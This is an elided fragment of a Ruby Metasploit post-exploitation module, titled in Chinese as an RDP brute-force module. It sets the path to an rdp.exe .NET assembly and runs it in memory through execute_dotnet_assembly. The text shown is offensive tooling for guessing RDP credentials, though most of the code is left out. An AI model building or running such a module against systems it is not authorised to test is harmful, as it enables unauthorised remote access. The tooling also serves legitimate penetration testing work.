...
class MetasploitModule < Msf::Post
    ...
    def initialize(info = {})
        super(
            update_info(
                ...
                'Name' => 'RDP爆破模块',
                'Description' => %q{
                本模块调用execute_dotnet_assembly模块在内存中执行rdp爆破程序
                },
                'License' => MSF_LICENSE,
                'Author' => ['3ricK5r'],
                'Arch' => [ARCH_X64],
    ...
    def run
        ...
        rdp_exe_path = ::File.join(Msf::Config.data_directory, 'post', 'scanner', 'rdp.exe')
        rdp_exe_path = ::File.expand_path(rdp_exe_path)
        datastore['DOTNET_EXE'] = rdp_exe_path
        vprint_status("DOTNET_EXE: #{rdp_exe_path}")
        ...
        unless File.file?(rdp_exe_path)
            fail_with(Failure::BadConfig, "错误：没有找到.net运行程序#{rdp_exe_path}！")
        end
